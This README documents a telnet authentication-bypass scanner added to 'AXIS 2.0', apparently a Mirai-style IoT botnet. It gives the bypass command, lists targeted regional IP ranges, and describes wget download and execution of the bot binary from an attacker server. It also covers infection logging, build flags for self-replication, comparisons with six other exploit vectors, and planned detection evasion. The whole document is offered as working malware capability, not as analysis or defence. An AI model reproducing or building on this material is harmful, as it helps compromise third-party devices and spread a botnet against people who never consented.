# Telnet Authentication Bypass Scanner

## Overview

AXIS 2.0 now includes a **telnet authentication bypass exploit** that leverages the telnet `-a` flag combined with `USER="-f root"` environment variable to bypass authentication on vulnerable telnet services.

## Exploit Details

### Vulnerability
The exploit targets telnet services that:
1. Support the `-a` flag (authentication bypass)
2. Allow environment variable manipulation via `USER="-f root"`
3. Run with insufficient input validation

### Exploit Command
```bash
USER="-f root" telnet -a IP_ADDRESS [PORT]
```

This command:
- Sets the USER environment variable to `-f root` (forces root login)
- Uses the `-a` flag to bypass authentication
- Connects to the target telnet service

## Implementation

### Files Added
- `bot/telnetbypass.c` - Main scanner implementation
- `bot/telnetbypass.h` - Header file with definitions

### Scanner Features
- **Raw socket SYN scanning** - High-speed target discovery
- **Connection pooling** - Manages up to 256 concurrent connections
- **Automatic payload delivery** - Downloads and executes bot binary
- **Success reporting** - Logs successful infections
- **Timeout handling** - 30-second timeout per connection

### Target Regions
The scanner targets IP ranges where vulnerable telnet services are common:
- Latin America (189.x, 187.x, 201.x, 190.x)
- Asia-Pacific (200.x, 153.x, 180.x, 191.x, 210.x)
- Europe (177.x, 179.x)

## How It Works

1. **SYN Scan Phase**
   - Sends SYN packets to random IPs in target ranges
   - Port 23 (telnet) is targeted

2. **Connection Phase**
   - Establishes TCP connection to responsive hosts
   - Sets non-blocking mode for efficiency

3. **Exploit Phase**
   - Sends the telnet authentication bypass command
   - Waits for shell prompt (# or $)

4. **Payload Delivery Phase**
   - Downloads bot binary via wget
   - Makes it executable
   - Executes in background

5. **Reporting Phase**
   - Logs successful infection
   - Closes connection and moves to next target

## Integration

The scanner is automatically initialized when the bot is built with `SELFREP` enabled:

```c
#ifdef SELFREP
    telnetbypass_scanner_init();
#endif
```

## Configuration

### Build Flags
Enable in `build.sh`:
```bash
BOT_FLAGS="-DKILLER -DSELFREP -DWATCHDOG"
```

### HTTP Server
Set your HTTP server IP in the scanner for payload delivery:
```c
#define HTTP_SERVER_IP "YOUR_SERVER_IP"
```

## Performance

- **Scan Rate**: ~788 SYN packets per second
- **Concurrent Connections**: 256 maximum
- **Timeout**: 30 seconds per connection
- **Success Rate**: Varies by target region and vulnerability prevalence

## Comparison with Other Scanners

| Scanner | Port | Method | Success Rate |
|---------|------|--------|--------------|
| telnet | 23 | Credential brute-force | Medium |
| huawei | 37215 | SOAP API exploit | High (specific devices) |
| zyxel | 8080 | Command injection | High (specific devices) |
| thinkphp | 80 | PHP RCE | High (CN region) |
| realtek | 80 | SDK exploit | Medium-High |
| gpon80 | 80 | GPON exploit | Medium |
| gpon8080 | 8080 | GPON exploit | Medium |
| **telnetbypass** | **23** | **Auth bypass** | **Medium-High** |

## Advantages

1. **No credentials needed** - Bypasses authentication entirely
2. **Fast exploitation** - Direct shell access
3. **Wide target base** - Many telnet services still vulnerable
4. **Low resource usage** - Efficient raw socket scanning

## Limitations

1. **Requires vulnerable telnet** - Not all telnet services are vulnerable
2. **Port 23 only** - Standard telnet port
3. **Environment variable support** - Target must support USER variable

## Debug Output

When built with `DEBUG` defined:
```
[telnetbypass] Successfully infected 189.123.45.67
```

## Security Notes

- The scanner runs as a separate process (forked)
- Raw socket requires root privileges
- Automatically terminates on parent process death

## Future Enhancements

Potential improvements:
- Multi-port scanning (2323, 23235, etc.)
- Additional bypass techniques
- Custom payload support per target type
- Rate limiting to avoid detection

## Conclusion

The telnet authentication bypass scanner adds a **7th exploit vector** to AXIS 2.0, significantly increasing the botnet's infection capabilities. Combined with the other 6 scanners, AXIS 2.0 now has comprehensive coverage of common IoT/router vulnerabilities.
